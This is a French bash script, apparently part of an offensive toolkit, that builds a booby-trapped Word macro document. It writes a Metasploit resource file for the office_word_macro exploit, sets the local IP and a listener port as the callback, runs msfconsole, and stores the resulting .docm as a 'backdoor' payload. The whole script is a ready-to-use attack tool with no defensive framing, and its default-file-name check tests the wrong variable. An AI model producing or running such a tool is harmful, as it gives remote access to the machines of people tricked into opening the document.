## Couleurs BASH
DEFAULT="\e[00m"
BLACK="\e[30m"
RED="\e[31m"
GREEN="\e[32m"
ORANGE="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
WHITE="\e[37m"

## Effets de texte (défaut, gras, souligné)
export DEF="\e[0;0m"
export BOLD="\e[1m"
export UNDER="\e[4m"

eth0=`ifconfig | grep -v -i "ether" | awk {'print $1'} | sed "s/.$//" | grep "eth" | tail -1` > /dev/null 2>&1
wlan0=`ifconfig | awk {'print $1'} | sed "s/.$//" | grep "wlan" | tail -1` > /dev/null 2>&1
if [ -z "$wlan0" ];then
	if [ -z "$eth0" ];then
		interface="lo"
	else
		interface=$eth0
	fi
else
	interface=$wlan0
fi
ipprivee=`ifconfig $interface | grep -w "inet" | awk '{print $2}'` > /dev/null 2>&1
ippublique=`wget http://checkip.dyndns.org -O - -o /dev/null | cut -d : -f 2 | cut -d \< -f 1` > /dev/null 2>&1
gateway=`ip route | grep "default" | awk {'print $3'}` > /dev/null 2>&1
session=`hostname`
iprange=`ip route | grep "kernel" | awk {'print $1'}` > /dev/null 2>&1
path=`pwd`


trap ctrl_c INT
ctrl_c() {
echo "" && echo ""
rm $path/../../logs/backdoor_creation
echo -e -n "$MAGENTA [>]$CYAN Appuiez sur ENTRÉE pour afficher les options.$DEFAULT"
read -e -p "
" -n 1 -s
cd
cd $path/../../
./suite.sh
}

echo -e -n "$MAGENTA [>]$DEFAULT$CYAN Entrez le nom à donner au fichier piégé (NOM.docm) : $DEFAULT"
read name

echo -e -n "$MAGENTA [>]$DEFAULT$CYAN Entrez le port à utiliser (réutiliser ce port lors de l'ouverture du listener) (4444) : $DEFAULT"
read port

if [ -z "$nom" ]
then
	nom="payload.docm"
fi
if [ -z "$port" ]
then
	port=4444
fi

echo -e "
$BLUE [...]$DEFAULT$CYAN Création du fichier de configuration du payload (format office Word macro)... $DEFAULT
"

echo "use exploit/multi/fileformat/office_word_macro
set lhost $ipprivee
set lport $port
exploit
exit" > $path/../../logs/backdoor_creation

sleep 0.6

echo -e "$GREEN$BOLD [+]$DEFAULT$CYAN Les fichiers de configuration ont bien été créés. $DEFAULT
"

cd $path/../../output/
chemin=`pwd`
cd $path

echo -e "$BLUE [...]$DEFAULT$CYAN Création du payload... $DEFAULT
"

msfconsole -q -r $path/../../logs/backdoor_creation | grep "abracadabra"

echo -e "$BLUE [...]$DEFAULT$CYAN Stockage du payload... $DEFAULT
"

cp /root/.msf4/local/msf.docm $path/../../output/
mv $path/../../output/msf.docm $path/../../output/$name
sleep 0.5

echo -e "$GREEN$BOLD [+]$DEFAULT$CYAN Le payload a bien été créé. $DEFAULT
"
sleep 0.2

echo -e "$GREEN$BOLD [+]$DEFAULT$CYAN Le payload se trouve ici : $chemin/. $DEFAULT
"

rm $path/../../logs/backdoor_creation

sleep 1



echo ""
echo -e -n "$MAGENTA [>]$CYAN Appuiez sur ENTRÉE pour afficher les options.$DEFAULT"
read -e -p "
" -n 1 -s




cd
cd $path/../../
./suite.sh
